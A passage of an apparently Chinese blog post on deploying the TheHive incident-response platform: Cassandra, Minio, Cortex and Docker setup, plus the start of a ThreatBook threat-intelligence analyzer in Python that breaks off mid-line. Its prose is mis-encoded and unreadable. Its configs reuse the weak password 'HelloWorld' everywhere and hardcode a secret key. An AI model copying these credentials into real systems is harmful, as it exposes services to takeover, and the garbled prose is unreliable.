4051f9d4-91de-43e5-9a4a-c3da46417830  rack1</span><br><span class="line">UN  192.168.199.37  437.13 KiB  256          100.0%            8844626f-04c0-4dd3-855e-088935b8dc65  rack1</span><br></pre></td></tr></table></figure></li>
<li><p>åˆå§‹åŒ–æ•°æ®åº“</p>
<ul>
<li>ä¿®æ”¹æ•°æ®åº“é»˜è®¤å¯†ç ï¼ˆé»˜è®¤è´¦æˆ·å¯†ç ï¼š<code>cassandra</code>/<code>cassandra</code>ï¼‰</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh th01 -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER USER cassandra WITH PASSWORD <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; quit;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¡®ä¿æ‰€æœ‰èŠ‚ç‚¹ä¸Šçš„ç”¨æˆ·è´¦æˆ·éƒ½æ˜¯ä¸€è‡´çš„</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh &lt;ip node X&gt; -u cassandra</span><br><span class="line">cassandra@cqlsh&gt; ALTER KEYSPACE system_auth WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: 3 &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºåä¸º<code>thehive</code>çš„<code>KEYSPACE</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE KEYSPACE thehive WITH replication = &#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;SimpleStrategy&#x27;</span>, <span class="string">&#x27;replication_factor&#x27;</span>: <span class="string">&#x27;3&#x27;</span> &#125; AND durable_writes = <span class="string">&#x27;true&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºè§’è‰²<code>thehive</code>ï¼Œå¹¶æˆäºˆ<code>thehive</code> æƒé™ï¼ˆé€‰æ‹©å¯†ç ï¼‰</li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; CREATE ROLE thehive WITH LOGIN = <span class="literal">true</span> AND PASSWORD = <span class="string">&#x27;HelloWorld&#x27;</span>;</span><br><span class="line">cassandra@cqlsh&gt; GRANT ALL PERMISSIONS ON KEYSPACE thehive TO <span class="string">&#x27;thehive&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><em>TheHive</em> ç›¸å…³é…ç½®</p>
<p> ç”±äºæœ€æ–°çš„<em>TheHive</em>é›†ç¾¤éœ€è¦é…åˆ<em>ElasticSearch</em>è¿›è¡Œç´¢å¼•ï¼Œå› æ­¤éœ€è¦åŒæ­¥æ›´æ–°å¦‚ä¸‹é…ç½®ï¼š</p>
<ul>
<li>æ›´æ–°<code>/etc/thehive/application.conf</code>é…ç½®</li>
</ul>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">db.janusgraph</span> &#123;</span><br><span class="line">  <span class="string">storage</span> &#123;</span><br><span class="line">    <span class="comment">## Cassandra configuration</span></span><br><span class="line">    <span class="attr">backend:</span> <span class="string">cql</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;ip node 1&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 2&gt;&quot;</span>, <span class="string">&quot;&lt;ip node 3&gt;&quot;</span>]</span><br><span class="line">    <span class="attr">username:</span> <span class="string">&quot;cassandra&quot;</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">cql</span> &#123;</span><br><span class="line">      <span class="attr">cluster-name:</span> <span class="string">thp</span></span><br><span class="line">      <span class="attr">keyspace:</span> <span class="string">thehive</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Index configuration</span></span><br><span class="line">  <span class="string">index.search</span> &#123;</span><br><span class="line">    <span class="attr">backend:</span> <span class="string">elasticsearch</span></span><br><span class="line">    <span class="attr">hostname:</span> [<span class="string">&quot;&lt;es node 1&gt;&quot;</span>, <span class="string">&quot;es node 2&quot;</span>, <span class="string">&quot;es node 3&quot;</span>]</span><br><span class="line">    <span class="attr">index-name:</span> <span class="string">thehive</span></span><br><span class="line">    <span class="comment"># auth</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.type=basic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.username=elastic</span></span><br><span class="line">    <span class="string">elasticsearch.http.auth.basic.password=HelloWorld</span></span><br><span class="line">    <span class="comment"># ssl</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.enabled=true</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.location=/etc/thehive/truststore.jks</span></span><br><span class="line">    <span class="string">elasticsearch.ssl.truststore.password=HelloWorld</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Minio"><a href="#Minio" class="headerlink" title="Minio"></a><em>Minio</em></h3><p>â€‹    ç”±äºæˆ‘çš„æ–‡ä»¶å­˜å‚¨æ˜¯é‡‡ç”¨äº†<em>Minio</em>ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦é…ç½®ä¸€ä¸‹ã€‚å…¶å®æ›´ç®€å•çš„æ–¹å¼ï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨<em>S3</em>ã€‚</p>
<ul>
<li>åˆ›å»ºç›®å½•</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºç”¨æˆ·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åˆ›å»ºæ•°æ®å·</p>
<p> åœ¨æ¯å°æœåŠ¡å™¨ä¸Šè‡³å°‘åˆ›å»º2ä¸ªæ•°æ®å·</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p /srv/minio/&#123;1,2&#125;</span><br><span class="line">$ chown -R minio:minio /srv/minio</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹ä¸»æœºå</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/hosts</span><br><span class="line">192.168.199.35  minio1</span><br><span class="line">192.168.199.36  minio2</span><br><span class="line">192.168.199.37  minio3</span><br></pre></td></tr></table></figure>

<ul>
<li>å®‰è£…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /opt/minio</span><br><span class="line">$ mkdir /opt/minio/&#123;bin,etc&#125;</span><br><span class="line">$ wget -O /opt/minio/bin/minio https://dl.minio.io/server/minio/release/linux-amd64/minio</span><br><span class="line">$ chown -R minio:minio /opt/minio</span><br></pre></td></tr></table></figure>

<ul>
<li><p>é…ç½®</p>
<ul>
<li>æ–°å»ºé…ç½®æ–‡ä»¶<code>/opt/minio/etc/minio.conf</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MINIO_OPTS=<span class="string">&quot;server --address :9100 http://minio&#123;1...3&#125;/srv/minio/&#123;1...2&#125;&quot;</span></span><br><span class="line">MINIO_ACCESS_KEY=<span class="string">&quot;admin&quot;</span></span><br><span class="line">MINIO_SECRET_KEY=<span class="string">&quot;HelloWorld&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ–°å»ºç³»ç»Ÿå¯åŠ¨æ–‡ä»¶<code>/usr/lib/systemd/system/minio.service</code></li>
</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=minio</span><br><span class="line">Documentation=https://docs.min.io</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network-online.target</span><br><span class="line">AssertFileIsExecutable=/opt/minio/bin/minio</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">WorkingDirectory=/opt/minio</span><br><span class="line">User=minio</span><br><span class="line">Group=minio</span><br><span class="line">EnvironmentFile=/opt/minio/etc/minio.conf</span><br><span class="line">ExecStart=/opt/minio/bin/minio <span class="variable">$MINIO_OPTS</span></span><br><span class="line">Restart=always</span><br><span class="line">LimitNOFILE=65536</span><br><span class="line">TimeoutStopSec=0</span><br><span class="line">SendSIGKILL=no</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>å¯åŠ¨</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl <span class="built_in">enable</span> minio</span><br><span class="line">$ systemctl start minio.service</span><br></pre></td></tr></table></figure>

<p>æ³¨ï¼š<em>è¿™é‡Œè®°å¾—ç¡®è®¤ä¸€ä¸‹æƒé™çš„é—®é¢˜ï¼Œæƒé™ä¸å¯¹çš„è¯ä¼šå¯¼è‡´è¿›ç¨‹èµ·ä¸æ¥ã€‚</em></p>
<ul>
<li><p>åˆ›å»º<em>bucket</em></p>
<ul>
<li>ç™»å½•<em>Minio</em> <strong><a target="_blank" rel="noopener" href="http://minio1:9100/">http://minio1:9100</a></strong></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-1.png" alt="Minio-1"></p>
<ul>
<li>åˆ›å»º<em>bucket</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Minio-2.png" alt="Minio-2"></p>
</li>
<li><p>ä¿®æ”¹<em>TheHive</em>é…ç½®æ–‡ä»¶ <code> /etc/thehive/application.conf</code></p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Attachment storage configuration</span></span><br><span class="line"><span class="string">storage</span> &#123;</span><br><span class="line">  <span class="attr">provider:</span> <span class="string">s3</span></span><br><span class="line">  <span class="string">s3</span> &#123;</span><br><span class="line">    <span class="string">bucket</span> <span class="string">=</span> <span class="string">&quot;thehive&quot;</span></span><br><span class="line">    <span class="string">readTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">writeTimeout</span> <span class="string">=</span> <span class="number">1</span> <span class="string">minute</span></span><br><span class="line">    <span class="string">chunkSize</span> <span class="string">=</span> <span class="number">1</span> <span class="string">MB</span></span><br><span class="line">    <span class="string">endpoint</span> <span class="string">=</span> <span class="string">&quot;http://minio1:9100&quot;</span></span><br><span class="line">    <span class="string">accessKey</span> <span class="string">=</span> <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="string">secretKey</span> <span class="string">=</span> <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">    <span class="string">region</span> <span class="string">=</span> <span class="string">&quot;us-east-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">alpakka.s3.path-style-access</span> <span class="string">=</span> <span class="string">force</span></span><br></pre></td></tr></table></figure>

<h3 id="Cortex"><a href="#Cortex" class="headerlink" title="Cortex"></a><em>Cortex</em></h3><ul>
<li><p>ä¿®æ”¹ <em>Cortex</em> é…ç½®æ–‡ä»¶  <code>/etc/cortex/application.conf</code></p>
<p>è¿™é‡Œæ³¨æ„ï¼Œå®˜æ–¹é»˜è®¤çš„é…ç½®æ–‡ä»¶æœ‰ä¸ªå°é—®é¢˜ã€‚å½“é‡‡ç”¨<em>Elastic</em>è®¤è¯çš„æ—¶å€™éœ€è¦å°†<code>username</code>ä¿®æ”¹ä¸º<code>user</code>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">play.http.secret.key=<span class="string">&quot;QZUm2UgZYXF6axC&quot;</span></span><br><span class="line">search &#123;</span><br><span class="line">  index = cortex</span><br><span class="line">  uri = <span class="string">&quot;https://elasticsearch01:9200,elasticsearch02:9200,elasticsearch03:9200&quot;</span></span><br><span class="line">  user = <span class="string">&quot;elastic&quot;</span>	<span class="comment"># ä¿®æ”¹usernameä¸ºuser</span></span><br><span class="line">  password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  keyStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  trustStore &#123;</span><br><span class="line">    path = <span class="string">&quot;/etc/cortex/truststore.jks&quot;</span></span><br><span class="line">    password = <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analyzers-and-Responders"><a href="#Analyzers-and-Responders" class="headerlink" title="Analyzers and Responders"></a><em>Analyzers and Responders</em></h4><p>â€‹    ç”±äºåœ¨<em>Cortex</em> 3ä¸­å®ç°äº†å¯¹<em>dockerized</em>åˆ†æå™¨çš„æ”¯æŒï¼Œå®‰è£…è¿‡ç¨‹å·²ç»è¢«å¤§å¤§ç®€åŒ–ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ä¸å¿…çº ç»“äºå®‰è£…æ’ä»¶æ—¶çš„<em>Python</em>æˆ–å…¶ä»–åº“ä¾èµ–é¡¹è¿™ç§å¤´ç–¼çš„é—®é¢˜ã€‚</p>
<ul>
<li>å®‰è£…<em>Docker</em></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu 18.04</span></span><br><span class="line">$ wget -O- https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">$ add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable&quot;</span></span><br><span class="line">$ sudo apt-get update </span><br><span class="line">$ sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>

<ul>
<li>ç»™<em>Cortex</em>è´¦æˆ·è¿è¡Œ<em>Docker</em>çš„æƒé™</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ usermod -a -G docker cortex</span><br></pre></td></tr></table></figure>

<ul>
<li>æ›´æ–°é…ç½®æ–‡ä»¶<code>/etc/cortex/application.conf</code>ï¼Œå¯ç”¨<code>analyzers.json</code></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span>	<span class="comment"># æœ¬æ¬¡æ–°å¢</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span> <span class="comment"># æœ¬æ¬¡æ–°å¢</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å‚è€ƒ<ul>
<li><strong><a target="_blank" rel="noopener" href="https://blog.thehive-project.org/2019/11/20/unleash-the-power-of-dockerized-analyzers-in-5-minutes/">Unleash the Power of Dockerized Analyzers in 5 Minutes</a></strong></li>
</ul>
</li>
</ul>
<hr>
<h2 id="å¦‚ä½•åˆ›å»ºæ’ä»¶"><a href="#å¦‚ä½•åˆ›å»ºæ’ä»¶" class="headerlink" title="å¦‚ä½•åˆ›å»ºæ’ä»¶"></a>å¦‚ä½•åˆ›å»ºæ’ä»¶</h2><p>â€‹    å‰é¢æœ‰è¯´åˆ°<em>Cortex</em>ç»„ä»¶é»˜è®¤å·²ç»é›†æˆäº†ä¸°å¯Œçš„<em>Analyzers</em>ä¸<em>Responses</em>æ’ä»¶ï¼Œä¾¿äºè¿è¥äººå‘˜å¿«é€Ÿçš„å¯¹å®‰å…¨äº‹ä»¶è¿›è¡Œåˆ†æä¸å“åº”ã€‚åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­æ ¹æ®éœ€æ±‚åœºæ™¯çš„ä¸åŒï¼Œæˆ‘ä»¬ä»éœ€è¦è¿›è¡Œä¸€äº›æ’ä»¶çš„å®šåˆ¶åŒ–ã€‚å¦‚ä½•åˆ›å»ºæ’ä»¶ï¼Œå®˜ç½‘æœ‰å¾ˆè¯¦ç»†çš„æ–‡æ¡£ä»‹ç»ï¼Œè¯·å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://github.com/TheHive-Project/CortexDocs/blob/master/api/how-to-create-an-analyzer.md"><em><strong>How to Write and Submit an Analyzer</strong></em></a>ã€‚ä»¥ä¸‹é™„ä¸Šäº†éƒ¨åˆ†æ–°å¢çš„æ’ä»¶ä»£ç ï¼š</p>
<p><strong>å¥½äº†ï¼ŒåºŸè¯å°‘è¯´ï¼Œæ”¾â€œç â€è¿‡æ¥ï¼ï¼ï¼</strong></p>
<h3 id="Analyzers-æ’ä»¶"><a href="#Analyzers-æ’ä»¶" class="headerlink" title="Analyzers - æ’ä»¶"></a>Analyzers - æ’ä»¶</h3><h4 id="å¾®æ­©åœ¨çº¿"><a href="#å¾®æ­©åœ¨çº¿" class="headerlink" title="å¾®æ­©åœ¨çº¿"></a>å¾®æ­©åœ¨çº¿</h4><p>â€‹    ç”±äºæˆ‘ä»¬å·²ç»è´­ä¹°äº†å•†ä¸šï¼ˆå¾®æ­©åœ¨çº¿ï¼‰å¨èƒæƒ…æŠ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå’Œ<em>TheHive</em>è¿›è¡Œäº†æ•´åˆã€‚</p>
<ul>
<li><em><strong>threatbook.py</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBookError</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, message</span>):</span></span><br><span class="line">        Exception.__init__(self, message)</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreatBook</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Threat intelligence: Threat Book</span></span><br><span class="line"><span class="string">    https://x.threatbook.cn/nodev4/vb4/API</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.ua = <span class="string">&quot;HappyHunting&quot;</span></span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.urls = &#123;</span><br><span class="line">            <span class="string">&#x27;compromise&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/dns&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;reputation&#x27;</span>: <span class="string">&#x27;https://api.threatbook.cn/v3/scene/ip_reputation&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_request</span>(<span class="params">self, url, params=&#123;&#125;</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Request an url</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: self.ua&#125;</span><br><span class="line">        r = self.session.get(</span><br><span class="line">            url=url,</span><br><span class="line">            params=params,</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            &quot;response_code&quot;: -1,</span></span><br><span class="line"><span class="string">            &quot;verbose_msg&quot;: &quot;Invalid Access IP&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(</span><br><span class="line">                <span class="string">&#x27;Invalid HTTP status code %i&#x27;</span> % r.status_code)</span><br><span class="line">        <span class="keyword">if</span> r.json()[<span class="string">&#x27;response_code&#x27;</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ThreatBookError(r.json())</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser_results</span>(<span class="params">self, results</span>):</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">            intel = &#123;</span><br><span class="line">                <span class="string">&#x27;ioc&#x27;</span>: k,</span><br><span class="line">                <span class="string">&#x27;malicious&#x27;</span>: v[<span class="string">&#x27;is_malicious&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;confidence&#x27;</span>: v[<span class="string">&#x27;confidence_level&#x27;</span>],</span><br><span class="line">                <span class="string">&#x27;tags&#x27;</span>: v[<span class="string">&#x27;judgments&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> intel</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reputation</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting reputation IP&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;reputation&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(results[<span class="string">&#x27;data&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_compromise</span>(<span class="params">self, ioc</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Getting compromise IoC&quot;&quot;&quot;</span></span><br><span class="line">        url = self.urls[<span class="string">&#x27;compromise&#x27;</span>]</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;apikey&#x27;</span>: self.key,</span><br><span class="line">            <span class="string">&#x27;resource&#x27;</span>: ioc</span><br><span class="line">        &#125;</span><br><span class="line">        results = self._request(url=url, params=params)</span><br><span class="line">        <span class="keyword">return</span> self.parser_results(<span class="built_in">list</span>(results[<span class="string">&#x27;data&#x27;</span>].values())[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;&lt;api_key&gt;&#x27;</span></span><br><span class="line">    threat = ThreatBook(key)</span><br><span class="line">    <span class="comment"># reputation</span></span><br><span class="line">    ioc = <span 